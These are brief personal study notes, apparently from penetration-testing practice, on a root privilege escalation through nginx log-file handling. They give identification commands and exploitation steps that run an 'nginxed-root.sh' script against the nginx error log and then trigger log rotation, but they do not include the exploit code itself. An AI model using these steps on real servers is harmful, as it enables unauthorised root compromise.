**Vulnerability with nginx** which allows to compromise the server and gain access as **root**.
**Requirements:-**
---
- ==**Requires SUID bit to be set on `sudo`**==
- **==Requires restart / start-stop of nginx==**

# Identification
---
- Using `./linux-exploit-suggester.sh`:
	- ![[Pasted image 20250429161355.png]]
- `dpkg -l | grep nginx`
	- ![[Pasted image 20250429161428.png]]
- It replaces the log files with malicious files

# Exploitation
---
- `./nginxed-root.sh /var/log/nginx/error.log`
	- ![[Pasted image 20250429161938.png]]
- Restart the nginx as root (simulating root or some service):
	- `invoke-rc.d nginx rotate > /dev/null 2>&1`
  ![[Pasted image 20250429162411.png]]